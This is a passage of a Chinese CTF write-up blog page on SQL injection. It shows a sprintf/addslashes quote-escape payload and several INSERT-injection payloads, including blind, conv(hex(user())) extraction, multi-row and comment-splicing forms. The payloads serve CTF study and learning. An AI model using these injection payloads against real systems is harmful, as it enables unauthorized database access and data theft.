+<li><p>还有<code>sprintf</code></p>
+<p>第五届上海市大学生网络安全大赛TryLogin <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/109822811">https://blog.csdn.net/weixin_45551083/article/details/109822811</a></p>
+<p>构造<code>password=%1$&#39;xxxx</code>来逃逸引号 </p>
+<p> <img src="a76dca5f4446c1c5701e2e89a36896eb.png" alt="img"> </p>
+<p> <img src="2e049f48ec86091b5977842d727591d4.png" alt="img"> </p>
+<p>原理在 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41185953/article/details/80485075.%E5%85%B6%E5%AE%9E%E8%BF%98%E6%98%AF%E6%B2%A1%E6%90%9E%E5%A4%AA%E6%B8%85%E6%A5%9A">https://blog.csdn.net/weixin_41185953/article/details/80485075.其实还是没搞太清楚</a>.</p>
+</li>
+<li><p>二次注入</p>
+</li>
+</ol>
+<h2 id="0x04-insert注入"><a href="#0x04-insert注入" class="headerlink" title="0x04 insert注入"></a>0x04 insert注入</h2><p>这道题的insert注入似乎和以前遇到的都不太一样.来理一下思路</p>
+<ul>
+<li>bool类型的注入点 可以盲注</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">user</span>(sex, name) <span class="keyword">VALUES</span> (<span class="number">0</span>, <span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">user</span>(sex, name) <span class="keyword">VALUES</span> (<span class="number">0</span> <span class="keyword">or</span> <span class="number">-1</span> <span class="keyword">or</span> <span class="number">0</span>, <span class="string">&#x27;abc&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>数字型: 把结果转化为10进制数字</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO user(name, num) VALUES (<span class="string">&#x27;abc&#x27;</span>, <span class="number">123</span>);</span><br><span class="line">=&gt;</span><br><span class="line">INSERT INTO user(name, num) VALUES (<span class="string">&#x27;abc&#x27;</span>, <span class="number">0</span>+conv(hex(user()),<span class="number">16</span>,<span class="number">10</span>));</span><br><span class="line">或者 INSERT INTO user(name, num) VALUES (<span class="string">&#x27;abc&#x27;</span>, <span class="number">0</span>+conv(user(),<span class="number">36</span>,<span class="number">10</span>));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>字符类型,插入多条值</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span> (name,pwd) <span class="keyword">values</span> (<span class="string">&#x27;xxxx&#x27;</span>,<span class="string">&#x27;xxxx&#x27;</span>),((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>)# <span class="string">&#x27;,&#x27;</span>a<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>  而本道题是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> comment</span><br><span class="line"><span class="keyword">set</span> category <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">content <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">bo_id <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以利用本道题的trick</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> comment</span><br><span class="line"><span class="keyword">set</span> category <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>,content<span class="operator">=</span><span class="keyword">user</span>(),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">content = &#x27;*/</span>#<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">bo_id = &#x27;</span>$bo_id<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-最后"><a href="#0x05-最后" class="headerlink" title="0x05 最后"></a>0x05 最后</h2><p>中途还看到了这篇文章  <a target="_blank" rel="noopener" href="https://blog.spoock.com/2017/03/27/sql-mutil-injecton-and-block/">sql二次注入和截断联合使用</a> ,在  sql-mode 为非严格模式的时候,可以产生一种截断注入,就以后再研究了</p>
+<p>紧接着又做到了一个二次注入的题目: <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/113576689">[CISCN2019 华北赛区 Day1 Web5]CyberPunk题解</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E9%A2%98%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">0x01题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GitTools"><span class="toc-number">2.1.</span> <span class="toc-text">GitTools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">二次注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">0x02 二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-addslashes"><span class="toc-number">4.</span> <span class="toc-text">0x03 addslashes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-addslashes"><span class="toc-number">4.1.</span> <span class="toc-text">bypass addslashes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-insert%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">0x04 insert注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%9C%80%E5%90%8E"><span class="toc-number">6.</span> <span class="toc-text">0x05 最后</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&text=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&is_video=false&description=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入&body=Check out this article: http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&name=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    版权所有 &copy; 2021 L0nm4r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">归档</a></li><li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'lonmar-cn-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
